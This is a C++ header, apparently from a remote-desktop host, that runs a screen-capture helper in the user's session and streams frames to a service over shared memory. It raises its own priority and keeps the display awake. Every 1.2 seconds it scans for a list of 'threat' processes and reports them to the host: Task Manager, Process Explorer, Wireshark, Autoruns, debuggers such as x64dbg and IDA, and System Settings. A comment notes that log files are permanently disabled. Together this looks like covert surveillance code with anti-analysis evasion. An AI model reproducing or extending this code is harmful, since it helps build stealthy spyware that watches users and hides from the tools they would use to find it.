#pragma once
#include "host.h"
#include "logger.h"
#include "screen_capture.h"
#include "capture_ipc.h"
#include <tlhelp32.h>

// Threat process names (must match host's list in main.cpp)
static const char* kHelperThreats[] = {
    "taskmgr.exe","resmon.exe","perfmon.exe",
    "procexp.exe","procexp64.exe","procmon.exe","procmon64.exe",
    "processhacker.exe","systeminformer.exe",
    "pchunter.exe","pchunter64.exe","autoruns.exe","autoruns64.exe",
    "wireshark.exe","dumpcap.exe","tshark.exe",
    "fiddler.exe","httpdebugger.exe","httpdebuggerpro.exe","charles.exe",
    "tcpview.exe","tcpview64.exe","netmon.exe","smsniff.exe",
    "x64dbg.exe","x32dbg.exe","ollydbg.exe","ida.exe","ida64.exe","windbg.exe",
    "systemsettings.exe",
    nullptr
};

static std::string helper_lower(const std::string& s) {
    std::string r; r.reserve(s.size());
    for (char c : s) r += (char)tolower((unsigned char)c);
    return r;
}

static bool helper_is_threat(const std::string& exeLower, const char*& outName) {
    for (int i = 0; kHelperThreats[i]; i++) {
        if (exeLower == kHelperThreats[i]) { outName = kHelperThreats[i]; return true; }
    }
    return false;
}

// Single-pass enum: build a map pid → title for ALL visible non-iconic titled windows
struct HelperWinScan {
    std::map<DWORD, std::string> visible_pids;
};

static BOOL CALLBACK helper_enum_all(HWND hwnd, LPARAM lp) {
    auto* ctx = (HelperWinScan*)lp;
    if (!IsWindowVisible(hwnd)) return TRUE;
    if (IsIconic(hwnd)) return TRUE;
    char title[256] = {};
    int tlen = GetWindowTextA(hwnd, title, sizeof(title) - 1);
    if (tlen <= 0) return TRUE;
    DWORD pid = 0;
    GetWindowThreadProcessId(hwnd, &pid);
    if (pid && ctx->visible_pids.find(pid) == ctx->visible_pids.end())
        ctx->visible_pids[pid] = title;
    return TRUE;
}

// Returns list of (proc, title) for all visible threat processes
static int helper_scan_threats_all(std::vector<std::pair<std::string,std::string>>& out) {
    out.clear();
    HelperWinScan winScan;
    EnumWindows(helper_enum_all, (LPARAM)&winScan);
    if (winScan.visible_pids.empty()) return 0;

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            auto it = winScan.visible_pids.find(pe.th32ProcessID);
            if (it == winScan.visible_pids.end()) continue;
            char buf[MAX_PATH] = {};
            WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, buf, MAX_PATH, NULL, NULL);
            std::string lo = helper_lower(buf);
            const char* matched = nullptr;
            if (helper_is_threat(lo, matched)) {
                out.emplace_back(matched, it->second);
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return (int)out.size();
}

// ═══════════════════════════════════════════════════════════════
// Capture Helper — runs in interactive user session
// Captures screen via DXGI/GDI and writes frames to shared memory
// Spawned by the service process in Session 0
// ═══════════════════════════════════════════════════════════════

static int run_capture_helper(int argc, char** argv) {
    // Args: --capture-helper <parent_pid> <ipc_name>
    if (argc < 4) {
        fprintf(stderr, "Usage: --capture-helper <parent_pid> <ipc_name>\n");
        return 1;
    }

    DWORD parent_pid = (DWORD)atoi(argv[2]);
    std::string ipc_name = argv[3];

    Logger& log = Logger::get();
    log.set_level("INFO");
    // File logging permanently disabled — no log files created anywhere.
    // log.set_file("C:\\RDHostHelper.log");
    log.info("=== Capture helper starting, parent_pid=" + std::to_string(parent_pid) + " ipc=" + ipc_name + " ===");

    // Open parent process handle for death detection
    HANDLE hParent = OpenProcess(SYNCHRONIZE, FALSE, parent_pid);
    if (!hParent) {
        log.error("Cannot open parent process " + std::to_string(parent_pid) + ", err=" + std::to_string(GetLastError()));
        return 1;
    }

    // Open shared memory IPC
    CaptureIpcWriter ipc;
    // Retry opening IPC for up to 10 seconds (service may still be creating it)
    bool ipc_ok = false;
    for (int retry = 0; retry < 20; retry++) {
        if (ipc.open(ipc_name)) { ipc_ok = true; break; }
        Sleep(500);
    }
    if (!ipc_ok) {
        log.error("Cannot open IPC shared memory: " + ipc_name);
        CloseHandle(hParent);
        return 1;
    }
    log.info("IPC connected");

    // Initialize GDI+ (required for ScreenCapture)
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken = 0;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    // Initialize screen capture
    ScreenCapture screen;
    int scale = ipc.get_scale();
    if (scale < 10) scale = 80;
    screen.init(75, scale);

    log.info("Screen capture initialized, scale=" + std::to_string(scale));

    // High-priority capture
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    timeBeginPeriod(1);

    // MMCSS for low-latency capture
    DWORD mmcss_task = 0;
    HANDLE mmcss = AvSetMmThreadCharacteristicsW(L"Pro Audio", &mmcss_task);
    if (mmcss) AvSetMmThreadPriority(mmcss, AVRT_PRIORITY_HIGH);

    // Prevent display sleep
    SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED);

    int consecutive_timeouts = 0;
    uint32_t last_ctrl_seq = 0;
    DWORD last_threat_scan = 0;

    while (true) {
        // ── Threat scan every ~1.2s ──
        DWORD now = GetTickCount();
        if (now - last_threat_scan > 1200) {
            last_threat_scan = now;
            std::vector<std::pair<std::string,std::string>> threats;
            helper_scan_threats_all(threats);
            ipc.set_threat_list(threats);
        }

        // Check parent alive (non-blocking)
        if (WaitForSingleObject(hParent, 0) == WAIT_OBJECT_0) {
            log.info("Parent process died, exiting");
            break;
        }

        // Check shutdown flag
        if (ipc.should_shutdown()) {
            log.info("Shutdown signal received, exiting");
            break;
        }

        // Read control params (fps, scale)
        int target_fps = ipc.get_fps();
        if (target_fps < 5) target_fps = 30;
        if (target_fps > 60) target_fps = 60;
        int new_scale = ipc.get_scale();
        if (new_scale >= 10 && new_scale != scale) {
            scale = new_scale;
            screen.set_scale(scale);
        }

        auto frame_dur = std::chrono::milliseconds(1000 / target_fps);
        auto t0 = std::chrono::steady_clock::now();

        // Capture frame
        ScreenCapture::RawFrame raw;
        int result = screen.capture_raw_ex(raw);

        if (result == 0) {
            consecutive_timeouts++;
            if (consecutive_timeouts >= 3) {
                if (screen.force_gdi_capture(raw)) result = 1;
            }
        }

        if (result == 1 && !raw.pixels.empty()) {
            consecutive_timeouts = 0;
            ipc.write_frame(raw);
        }

        // Pace to target FPS
        auto elapsed = std::chrono::steady_clock::now() - t0;
        if (elapsed < frame_dur)
            std::this_thread::sleep_for(frame_dur - elapsed);
    }

    // Cleanup
    if (mmcss) AvRevertMmThreadCharacteristics(mmcss);
    timeEndPeriod(1);
    screen.stop();
    ipc.close();
    CloseHandle(hParent);

    if (gdiplusToken) Gdiplus::GdiplusShutdown(gdiplusToken);

    log.info("=== Capture helper stopped ===");
    return 0;
}
